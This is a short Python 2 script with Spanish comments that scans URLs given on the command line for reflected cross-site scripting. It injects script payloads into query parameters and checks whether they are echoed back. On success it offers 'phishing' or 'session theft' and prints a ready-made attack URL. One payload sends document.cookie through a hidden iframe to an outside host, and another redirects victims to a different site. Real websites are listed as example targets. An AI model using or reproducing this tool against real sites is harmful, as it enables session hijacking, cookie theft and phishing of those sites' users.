from bs4 import BeautifulSoup
import urllib
import sys
import time
''' Ejemplos
http://kids.britannica.com/search?query=3
http://sonica.speedy.com.ar/resultado_busqueda.php?Tipo=1&Texto=2
--
'''

exploits = ['<script>a=document.cookie;alert(a)</script>',
			'<IMG+"""><SCRIPT>alert(document.cookie)<%2FSCRIPT>']
#
PayloadCode=['var a=document.cookie;var ifr = document.createElement("iframe");ifr.src = "http://stackoverflow.com"+a;'+
             'document.body.appendChild(ifr);document.getElementsByTagName("iframe")[0].setAttribute("width", "0px");',
             'window.location="http://www.newlocation.com";']
Payload = ['<script>'+PayloadCode[0]+'</script>',
			'<IMG+"""><SCRIPT>'+PayloadCode[0]+'<%2FSCRIPT>']

PayloadPhish = ['<script>'+PayloadCode[1]+'</script>',
			'<IMG+"""><SCRIPT>'+PayloadCode[1]+'<%2FSCRIPT>']


def ConverUrl(array):
	url=""
	array.pop()
	for x in array:
		url=url+x+"="
	return url

url = [x for x in sys.argv[1:]]
url=[ConverUrl(x.split("=")) for x in url]
def exploit(url):
	if len(url)!=0:
		ganador=False
		index_pay=0
		for targets in url:
			for exp in exploits:
				newtarget=targets + exp
				print "Nuevo Target"
				print newtarget
				contents = urllib.urlopen(newtarget).read()
				print "/////////////////////////////"
				bs = BeautifulSoup(contents,"lxml")
				#print bs.__dict__
				#print type(bs.find_all('script'))
				scripts=bs.find_all('script')
				for src in scripts:
					if src.text.find('alert(')==0:
						print "**************"
						print 'WINNER LA PAGINA WEB ES VULNERABLE XD'
						print src
						index_pay = exploits.index(exp)
						ganador=True
						break
				if ganador:
					tipo=raw_input("Desea hacer phishing (p) o robo de sesiones (s)")
					print "**************"
					time.sleep(1)
					print "PAYLOAD PARA LA WEB"
					if tipo=='s':
						print targets+Payload[index_pay]
					elif tipo=='p':
						print targets+PayloadPhish[index_pay]

exploit(url)

